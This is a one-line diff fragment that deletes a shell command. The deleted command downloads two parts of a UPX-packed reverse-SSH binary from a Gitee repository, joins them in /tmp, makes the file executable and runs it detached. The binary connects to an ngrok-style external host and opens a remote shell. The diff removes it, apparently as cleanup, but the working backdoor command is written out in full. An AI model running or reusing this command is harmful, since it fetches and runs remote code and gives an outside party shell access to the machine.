@@ -1,1 +1,0 @@
-cd /tmp;curl -LO4k https://gitee.com/niuhu-blue/rec_she/raw/master/upx_reverse-sshx64.bin.001 && curl -LO4k https://gitee.com/niuhu-blue/rec_she/raw/master/upx_reverse-sshx64.bin.002&&cat upx_reverse-sshx64.bin.00? > upx_reverse-sshx64.bin&&chmod 0777 ./upx_reverse-sshx64.bin;setsid /tmp/upx_reverse-sshx64.bin -v -b 50060 -p 34292 ngrok.xiaomiqiu123.top &
